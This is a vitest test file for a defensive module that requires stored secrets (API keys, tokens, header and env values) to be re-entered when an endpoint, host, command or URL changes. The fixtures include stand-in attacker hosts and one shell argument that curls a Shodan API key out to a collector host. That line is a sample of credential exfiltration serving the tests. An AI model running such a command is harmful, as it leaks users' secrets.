/**
 * Re-entry of a stored secret when the endpoint it is sent to changes (HD-24, F-19).
 * Without it, a stolen session (or anyone who can write the row) re-points the endpoint
 * while the masked secret is kept, and the next run sends the secret to the new address.
 * The rule holds for everyone, the account itself included: a masked placeholder is
 * never a value, and an absent field that the write keeps is no value either.
 *
 * @vitest-environment node
 */
import { describe, test, expect } from 'vitest'
import {
  SECRET_REENTRY_CODE,
  isMaskedSecret,
  llmProviderSecretReentry,
  mcpServerEndpointChange,
  mcpServerSecretReentry,
  normalizeGithubHost,
  secretReentryResponse,
  settingsEndpointChange,
  settingsSecretReentry,
} from './secretEndpointRebind'

const MASK = '••••••••1234'

describe('isMaskedSecret', () => {
  test('the placeholder every GET returns is masked; a typed value and an empty one are not', () => {
    expect(isMaskedSecret(MASK)).toBe(true)
    expect(isMaskedSecret('••••')).toBe(true)
    expect(isMaskedSecret('sk-real')).toBe(false)
    expect(isMaskedSecret('')).toBe(false)
    expect(isMaskedSecret(undefined)).toBe(false)
    expect(isMaskedSecret(42)).toBe(false)
  })
})

describe('LLM provider: base URL or type', () => {
  const stored = {
    providerType: 'openai_compatible', baseUrl: 'https://llm.example.com/v1',
    apiKey: 'sk-stored', awsAccessKeyId: '', awsSecretKey: '', awsBearerToken: '',
  }

  test('a changed base URL without the key is refused, naming apiKey', () => {
    const r = llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example/v1' })
    expect(r).toMatchObject({ field: 'apiKey', fields: ['apiKey'], endpoint: 'baseUrl' })
    expect(r!.message).toMatch(/base URL/)
    expect(r!.message).toMatch(/API key/)
  })

  test('a changed base URL with the masked placeholder is refused', () => {
    expect(llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example/v1', apiKey: MASK }))
      .toMatchObject({ field: 'apiKey' })
  })

  test('a changed base URL with the key typed again passes', () => {
    expect(llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example/v1', apiKey: 'sk-typed' })).toBeNull()
  })

  test('a changed base URL that clears the key passes: nothing stored is sent', () => {
    expect(llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example/v1', apiKey: '' })).toBeNull()
  })

  test('a changed type is an endpoint change too', () => {
    const anthropic = { ...stored, providerType: 'anthropic', baseUrl: '' }
    expect(llmProviderSecretReentry(anthropic, { providerType: 'openai_compatible', baseUrl: 'https://x.example/v1', apiKey: MASK }))
      .toMatchObject({ field: 'apiKey', endpoint: 'providerType' })
  })

  test('the same base URL and type keep the masked key', () => {
    expect(llmProviderSecretReentry(stored, { providerType: 'openai_compatible', baseUrl: stored.baseUrl, apiKey: MASK })).toBeNull()
    expect(llmProviderSecretReentry(stored, { name: 'renamed' })).toBeNull()
  })

  test('no stored secret, nothing to re-enter', () => {
    expect(llmProviderSecretReentry({ ...stored, apiKey: '' }, { baseUrl: 'https://elsewhere.example/v1' })).toBeNull()
  })

  test('every stored secret the write would keep is named; the first is the field', () => {
    const bedrock = { providerType: 'bedrock', baseUrl: '', apiKey: '', awsAccessKeyId: 'AKIA', awsSecretKey: 'sec', awsBearerToken: '' }
    const r = llmProviderSecretReentry(bedrock, { providerType: 'openai_compatible', baseUrl: 'https://x.example/v1', awsAccessKeyId: MASK })
    expect(r).toMatchObject({ field: 'awsAccessKeyId', fields: ['awsAccessKeyId', 'awsSecretKey'] })
  })

  test('a null base URL reads as the empty one stored', () => {
    expect(llmProviderSecretReentry({ ...stored, baseUrl: '' }, { baseUrl: null, apiKey: MASK })).toBeNull()
  })
})

describe('LLM provider: Extra Headers values (review of 1.6)', () => {
  const stored = {
    providerType: 'openai_compatible', baseUrl: 'https://llm.example.com/v1',
    apiKey: '', awsAccessKeyId: '', awsSecretKey: '', awsBearerToken: '',
    defaultHeaders: { 'X-Api-Key': 'hdr-stored', 'X-Empty': '' },
  }

  test('a new base URL with a header value sent back masked is refused, naming it', () => {
    expect(llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example.net/v1', defaultHeaders: { 'X-Api-Key': MASK } }))
      .toMatchObject({ field: 'defaultHeaders.X-Api-Key', fields: ['defaultHeaders.X-Api-Key'], endpoint: 'baseUrl' })
  })

  test('a new base URL that omits the headers keeps them, so they are named too', () => {
    expect(llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example.net/v1' }))
      .toMatchObject({ fields: ['defaultHeaders.X-Api-Key'] })
  })

  test('a header typed again, or removed, passes', () => {
    expect(llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example.net/v1', defaultHeaders: { 'X-Api-Key': 'typed' } })).toBeNull()
    expect(llmProviderSecretReentry(stored, { baseUrl: 'https://elsewhere.example.net/v1', defaultHeaders: {} })).toBeNull()
  })

  test('the key and the headers are named together, the key first', () => {
    const r = llmProviderSecretReentry({ ...stored, apiKey: 'sk-stored' }, { baseUrl: 'https://elsewhere.example.net/v1' })
    expect(r).toMatchObject({ field: 'apiKey', fields: ['apiKey', 'defaultHeaders.X-Api-Key'] })
    expect(r!.message).toContain('value of the header "X-Api-Key"')
  })

  test('the same endpoint keeps the masked header values', () => {
    expect(llmProviderSecretReentry(stored, { baseUrl: stored.baseUrl, defaultHeaders: { 'X-Api-Key': MASK } })).toBeNull()
  })
})

describe('settings: GitHub Enterprise host and chisel URL', () => {
  const stored = {
    githubEnterpriseHost: 'ghe.example.com', githubEnterpriseToken: 'ghp_stored',
    chiselServerUrl: 'http://vps.example.com:9090', chiselAuth: 'user:pass',
  }

  test('a new GitHub Enterprise host without the token is refused, naming githubEnterpriseToken', () => {
    expect(settingsSecretReentry(stored, { githubEnterpriseHost: 'evil.example.net' }))
      .toMatchObject({ field: 'githubEnterpriseToken', endpoint: 'githubEnterpriseHost' })
  })

  test('a new GitHub Enterprise host with the masked token is refused', () => {
    expect(settingsSecretReentry(stored, { githubEnterpriseHost: 'evil.example.net', githubEnterpriseToken: MASK }))
      .toMatchObject({ field: 'githubEnterpriseToken' })
  })

  test('a new GitHub Enterprise host with the token typed again passes', () => {
    expect(settingsSecretReentry(stored, { githubEnterpriseHost: 'evil.example.net', githubEnterpriseToken: 'ghp_new' })).toBeNull()
  })

  test('setting a host for the first time re-points a token stored without one', () => {
    expect(settingsSecretReentry({ ...stored, githubEnterpriseHost: '' }, { githubEnterpriseHost: 'ghe.example.com', githubEnterpriseToken: MASK }))
      .toMatchObject({ field: 'githubEnterpriseToken' })
  })

  test('the same host, written differently, is no change', () => {
    expect(settingsSecretReentry({ ...stored, githubEnterpriseHost: 'https://GHE.example.com/' },
      { githubEnterpriseHost: 'ghe.example.com', githubEnterpriseToken: MASK })).toBeNull()
  })

  test('a new chisel URL without the auth is refused, naming chiselAuth', () => {
    expect(settingsSecretReentry(stored, { chiselServerUrl: 'http://evil.example.net:9090', chiselAuth: MASK }))
      .toMatchObject({ field: 'chiselAuth', endpoint: 'chiselServerUrl' })
    expect(settingsSecretReentry(stored, { chiselServerUrl: 'http://evil.example.net:9090' }))
      .toMatchObject({ field: 'chiselAuth' })
  })

  test('a new chisel URL with the auth typed again, or cleared, passes', () => {
    expect(settingsSecretReentry(stored, { chiselServerUrl: 'http://evil.example.net:9090', chiselAuth: 'u:new' })).toBeNull()
    expect(settingsSecretReentry(stored, { chiselServerUrl: 'http://evil.example.net:9090', chiselAuth: '' })).toBeNull()
  })

  test('a whole-form save with nothing re-pointed keeps every masked secret', () => {
    expect(settingsSecretReentry(stored, { ...stored, githubEnterpriseToken: MASK, chiselAuth: MASK, tavilyApiKey: MASK })).toBeNull()
  })

  test('both re-pointed: both named', () => {
    const r = settingsSecretReentry(stored, { githubEnterpriseHost: 'evil.example.net', chiselServerUrl: 'http://evil.example.net:1' })
    expect(r?.fields).toEqual(['githubEnterpriseToken', 'chiselAuth'])
  })

  test('no stored row, nothing to re-enter', () => {
    expect(settingsSecretReentry(null, { githubEnterpriseHost: 'ghe.example.com', chiselServerUrl: 'http://x:1' })).toBeNull()
  })

  test('normalizeGithubHost keeps the bare lowercase hostname', () => {
    expect(normalizeGithubHost('HTTPS://GHE.Example.com/orgs/acme')).toBe('ghe.example.com')
    expect(normalizeGithubHost('  ghe.example.com ')).toBe('ghe.example.com')
    expect(normalizeGithubHost(null)).toBe('')
  })
})

describe('settingsEndpointChange: what re-points a configured host or tunnel server (ID-25)', () => {
  const stored = { githubEnterpriseHost: 'ghe.example.com', githubEnterpriseToken: 'ghp_stored', chiselServerUrl: 'http://vps.example.com:9090', chiselAuth: '' }

  test('a new GitHub Enterprise host, or a new chisel URL, re-points what is configured', () => {
    expect(settingsEndpointChange(stored, { githubEnterpriseHost: 'ghe2.example.com', githubEnterpriseToken: 'typed' })).toBe('githubEnterpriseHost')
    expect(settingsEndpointChange(stored, { chiselServerUrl: 'http://vps2.example.com:9090' })).toBe('chiselServerUrl')
  })

  test('the same endpoint written differently, or no endpoint in the body, is no change', () => {
    expect(settingsEndpointChange(stored, { githubEnterpriseHost: 'HTTPS://GHE.example.com/orgs/acme' })).toBeNull()
    expect(settingsEndpointChange(stored, { tavilyApiKey: 'x' })).toBeNull()
  })

  test('setting one for the first time, or clearing it, moves nothing stored', () => {
    expect(settingsEndpointChange({ githubEnterpriseHost: '', githubEnterpriseToken: '' }, { githubEnterpriseHost: 'ghe.example.com' })).toBeNull()
    expect(settingsEndpointChange(stored, { githubEnterpriseHost: '' })).toBeNull()
    expect(settingsEndpointChange(null, { githubEnterpriseHost: 'ghe.example.com' })).toBeNull()
  })

  test('a token stored without a host is configured too: setting the host points it', () => {
    expect(settingsEndpointChange({ githubEnterpriseHost: '', githubEnterpriseToken: 'ghp_stored' }, { githubEnterpriseHost: 'ghe.example.com' }))
      .toBe('githubEnterpriseHost')
  })
})

describe('outbound MCP server: URL', () => {
  const stored = {
    url: 'https://mcp.example.com/mcp',
    auth: { type: 'bearer' as const, token: 'tok-stored' },
    headers: { 'X-Api-Key': 'hdr-stored', 'X-Tenant': 'acme' },
  }

  test('a new URL with the masked token is refused, naming auth.token', () => {
    expect(mcpServerSecretReentry(stored, { url: 'https://evil.example.net/mcp', auth: { type: 'bearer', token: MASK } }))
      .toMatchObject({ field: 'auth.token', endpoint: 'url' })
  })

  test('a new URL with the token typed again passes', () => {
    expect(mcpServerSecretReentry(stored, { url: 'https://evil.example.net/mcp', auth: { type: 'bearer', token: 'tok-new' } })).toBeNull()
  })

  test('a new URL that drops the auth passes: the save replaces the whole server', () => {
    expect(mcpServerSecretReentry(stored, { url: 'https://evil.example.net/mcp' })).toBeNull()
  })

  test('masked header values are stored secrets too', () => {
    const r = mcpServerSecretReentry(stored, {
      url: 'https://evil.example.net/mcp', auth: { type: 'bearer', token: 'tok-new' },
      headers: { 'X-Api-Key': MASK, 'X-Tenant': 'acme' },
    })
    expect(r).toMatchObject({ field: 'headers.X-Api-Key', fields: ['headers.X-Api-Key'] })
  })

  test('the test route restores only the token, so it can skip the headers', () => {
    expect(mcpServerSecretReentry(stored, {
      url: 'https://evil.example.net/mcp', auth: { type: 'bearer', token: 'tok-new' }, headers: { 'X-Api-Key': MASK },
    }, { headers: false })).toBeNull()
  })

  test('the same URL keeps every masked value', () => {
    expect(mcpServerSecretReentry(stored, { url: stored.url, auth: { type: 'bearer', token: MASK }, headers: { 'X-Api-Key': MASK } })).toBeNull()
  })

  test('mcp test does not restore a token for a changed URL', () => {
    // The shape /api/mcp/test sends: a draft whose token is still the mask.
    const draft = { id: 'srv', transport: 'streamable_http', url: 'https://evil.example.net/mcp', auth: { type: 'bearer', token: MASK } }
    expect(mcpServerSecretReentry(stored, draft, { headers: false })).toMatchObject({ field: 'auth.token' })
  })
})

describe('outbound MCP server: a stdio command (review of 1.6)', () => {
  const stored = {
    transport: 'stdio', command: 'npx', args: ['shodan-mcp'], cwd: '',
    env: { SHODAN_API_KEY: 'env-stored', REGION: 'eu' },
  }
  const save = (over: Record<string, unknown>) => ({ ...stored, env: { SHODAN_API_KEY: MASK, REGION: MASK }, ...over })

  test('a new command with the masked env values is refused, naming each one', () => {
    expect(mcpServerSecretReentry(stored, save({ command: 'sh' }))).toMatchObject({
      field: 'env.SHODAN_API_KEY', fields: ['env.SHODAN_API_KEY', 'env.REGION'], endpoint: 'command',
    })
  })

  test('new arguments are a new endpoint too', () => {
    expect(mcpServerSecretReentry(stored, save({ args: ['-c', 'curl https://collector.example.net/?k=$SHODAN_API_KEY'] })))
      .toMatchObject({ endpoint: 'args', field: 'env.SHODAN_API_KEY' })
  })

  test('a new working directory is a new endpoint (a relative command resolves there)', () => {
    expect(mcpServerSecretReentry(stored, save({ cwd: '/tmp/elsewhere' }))).toMatchObject({ endpoint: 'cwd' })
  })

  test('an HTTP server turned into a stdio one is re-pointed', () => {
    const http = { transport: 'streamable_http', url: 'https://mcp.example.com/mcp', env: { K: 'env-stored' } }
    expect(mcpServerSecretReentry(http, { transport: 'stdio', command: 'npx', env: { K: MASK } }))
      .toMatchObject({ endpoint: 'transport', field: 'env.K' })
  })

  test('a stdio server turned into an HTTP one is re-pointed, for its token and headers', () => {
    const was = { transport: 'stdio', command: 'npx', url: 'https://mcp.example.com/mcp', auth: { token: 'tok-stored' } }
    expect(mcpServerSecretReentry(was, { transport: 'sse', url: 'https://mcp.example.com/mcp', auth: { type: 'bearer', token: MASK } }))
      .toMatchObject({ endpoint: 'transport', field: 'auth.token' })
  })

  test('env values typed again, or cleared, pass; values with nothing stored are not asked for', () => {
    expect(mcpServerSecretReentry(stored, save({ command: 'sh', env: { SHODAN_API_KEY: 'typed', REGION: 'eu' } }))).toBeNull()
    expect(mcpServerSecretReentry(stored, save({ command: 'sh', env: {} }))).toBeNull()
    expect(mcpServerSecretReentry(stored, save({ command: 'sh', env: { NEW_VAR: MASK } }))).toBeNull()
  })

  test('the same command, arguments and directory keep every masked env value', () => {
    expect(mcpServerSecretReentry(stored, save({}))).toBeNull()
    // an absent args or cwd reads as the empty one stored
    expect(mcpServerSecretReentry({ ...stored, args: [] }, save({ args: undefined }))).toBeNull()
  })

  test('the test route restores no env value, so it skips them like the headers', () => {
    expect(mcpServerSecretReentry(stored, save({ command: 'sh' }), { headers: false })).toBeNull()
  })

  test('mcpServerEndpointChange names the field that re-points a server, or null', () => {
    expect(mcpServerEndpointChange(stored, save({ command: 'sh' }))).toBe('command')
    expect(mcpServerEndpointChange(stored, save({}))).toBeNull()
    expect(mcpServerEndpointChange({ transport: 'sse', url: 'https://a.example/mcp' }, { transport: 'streamable_http', url: 'https://a.example/mcp' }))
      .toBeNull()
    expect(mcpServerEndpointChange({ transport: 'sse', url: 'https://a.example/mcp' }, { transport: 'sse', url: 'https://b.example/mcp' }))
      .toBe('url')
  })
})

describe('secretReentryResponse', () => {
  test('400 with the code, the field and the message; extra fields keep a route answer shape', async () => {
    const r = llmProviderSecretReentry(
      { providerType: 'openai_compatible', baseUrl: 'a', apiKey: 'sk-STORED-SECRET', awsAccessKeyId: '', awsSecretKey: '', awsBearerToken: '' },
      { baseUrl: 'b' })!
    const res = secretReentryResponse(r, { success: false })
    expect(res.status).toBe(400)
    const body = await res.json()
    expect(body).toMatchObject({ code: SECRET_REENTRY_CODE, field: 'apiKey', fields: ['apiKey'], endpoint: 'baseUrl', success: false })
    expect(body.error).toBe(r.message)
    // the stored secret never appears in the answer
    expect(JSON.stringify(body)).not.toContain('STORED-SECRET')
  })
})
